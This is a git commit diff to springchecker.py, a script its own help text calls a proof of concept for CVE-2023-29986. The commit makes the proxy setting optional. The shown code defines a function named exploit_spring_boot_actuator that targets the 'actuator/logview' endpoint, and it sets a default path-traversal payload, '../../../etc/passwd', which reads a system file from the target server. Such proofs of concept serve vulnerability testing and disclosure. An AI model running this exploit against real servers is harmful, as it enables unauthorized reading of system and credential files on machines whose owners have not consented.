0a30ee0e5b54d73294d774d5b57852c94012aa70
davidfortytwo <85337431+davidfortytwo@users.noreply.github.com>
2023-09-29 14:13:38 +0200

    Update springchecker.py
    Change proxy to optional

--- springchecker.py
+++ springchecker.py
@@ -1,18 +1,17 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# Author: David Espejo (Fortytwo Security)
 import requests
 import argparse
 from urllib.parse import urljoin
 
-def exploit_spring_boot_actuator(target_url, proxy_url, payload_file=None):
+def exploit_spring_boot_actuator(target_url, proxy_url=None, payload_file=None):
     endpoint = "actuator/logview"
     
-    # Proxy settings
-    proxies = {
-        "http": proxy_url,
-        "https": proxy_url
-    }
+    # Proxy settings (if provided)
+    proxies = {}
+    if proxy_url:
+        proxies = {
+            "http": proxy_url,
+            "https": proxy_url
+        }
     
     # Default payload
     default_payload = "../../../etc/passwd"
@@ -49,11 +48,10 @@ def exploit_spring_boot_actuator(target_url, proxy_url, payload_file=None):
         except Exception as e:
             print(f"An error occurred with payload {payload}: {e}")
 
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="PoC for CVE-2023-29986")
     parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8080)")
-    parser.add_argument("-p", "--proxy", default="http://127.0.0.1:8080", help="Proxy URL (default is http://127.0.0.1:8080)")
+    parser.add_argument("-p", "--proxy", help="Proxy URL (optional)")
     parser.add_argument("-pl", "--payload-file", help="File containing payloads (optional)")
     
     args = parser.parse_args()
